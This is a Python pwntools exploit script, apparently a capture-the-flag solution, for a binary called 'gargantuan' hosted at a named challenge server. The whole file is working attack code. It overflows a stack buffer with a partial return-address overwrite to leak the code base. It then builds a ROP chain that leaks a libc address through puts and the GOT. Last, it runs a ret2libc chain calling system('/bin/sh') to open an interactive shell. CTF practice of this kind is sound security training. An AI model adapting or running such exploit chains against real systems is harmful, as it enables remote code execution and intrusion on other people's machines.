#!/usr/bin/env python3

from pwn import *

exe = ELF("./gargantuan_patched", checksec=False)
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")


from pwn import *



context.binary = exe



if args.LOCAL:
    r = process([exe.path])


else:
    r = remote("all.chal.cyberjousting.com", 1352)




def main():

    input()
    ### STAGE 1: LEAK CODE BASE
    #r = process(exe.path)
    #r = remote("all.chal.cyberjousting.com", 1352)

    padding = b"e"*41 + b"\x00"
    r.send(padding.ljust(512,b"\x00"))

    padding = (b"a"*256+b"\x00")
    padding = padding.ljust(512, b"\x00")
    r.send(padding*3)
    #r.sendline(b"b"*256+b"\x00")


    payload = b"s"*256 
    payload = payload.ljust(0x200-0x14-8-1, b"\x00")


    num_i = p32(4)
    payload += num_i.ljust(0x14, b"\x00")
    payload += p64(0) #rbp
    #payload += b"\xe5"
    payload += b"\x0b"
    r.send(payload)

    r.recvuntil(b" TOO LATE! ")

    gargantuan = int(r.recvline()[:-1], 16)
    print("gargantuan: ", hex(gargantuan))

    exe.address = gargantuan - exe.symbols['gargantuan']
    print("code base: ", hex(exe.address))


    ### STAGE 2: LEAK GOT (libc)
    time.sleep(5)

    padding = b"1"*256 + b"\x00"
    r.send(padding.ljust(512,b"\x00"))

    padding = b"2"*256 + b"\x00"
    r.send(padding.ljust(512,b"\x00"))

    padding = b"3"*256 + b"\x00"
    r.send(padding.ljust(512,b"\x00"))

    padding = b"4"*256 + b"\x00"
    r.send(padding.ljust(512,b"\x00"))

    # prepare
    pop_rdi = exe.address + 0x11e0
    setbuf_got = exe.got['setbuf']
    puts_plt = exe.plt['puts']



    payload = b"5"*256
    payload = payload.ljust(288-0x14, b"\x00")

    num_i = p32(4)
    payload += num_i.ljust(0x14, b"\x00")
    
    payload += p64(0) #rbp
    payload += p64(pop_rdi)
    payload += p64(setbuf_got)
    payload += p64(puts_plt)
    payload += p64(gargantuan)
    payload = payload.ljust(512, b"\x00")
    r.send(payload)


    r.recvuntil(b" Oops, TOO LATE!")
    r.recvline()


    #BINGO
    leak_addr = u64(r.recv(6) + b"\x00\x00")
    libc.address = leak_addr - libc.sym['setbuf']
    print("libc base: ", hex(libc.address))

    r.recvline() # just receive newline


    ### STAGE 3: Ret2libc (system binsh)

    #prepare
    system_address = libc.sym['system']            # location of system
    binsh = next(libc.search(b'/bin/sh'))  # "/bin/sh" location
    ret = exe.address+0x1016

    padding = b"h"*256 + b"\x00"
    r.send(padding.ljust(512,b"\x00"))

    padding = b"j"*256 + b"\x00"
    r.send(padding.ljust(512,b"\x00"))

    padding = b"w"*256 + b"\x00"
    r.send(padding.ljust(512,b"\x00"))

    padding = b"k"*256 + b"\x00"
    r.send(padding.ljust(512,b"\x00"))


    payload = b"x"*256
    payload = payload.ljust(288-0x14, b"\x00")

    num_i = p32(4)
    payload += num_i.ljust(0x14, b"\x00")


    payload += p64(0) #rbp
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(ret)
    payload += p64(system_address)
    payload = payload.ljust(512, b"\x00")
    r.sendline(payload)


    r.interactive() 


if __name__ == "__main__":
    main()
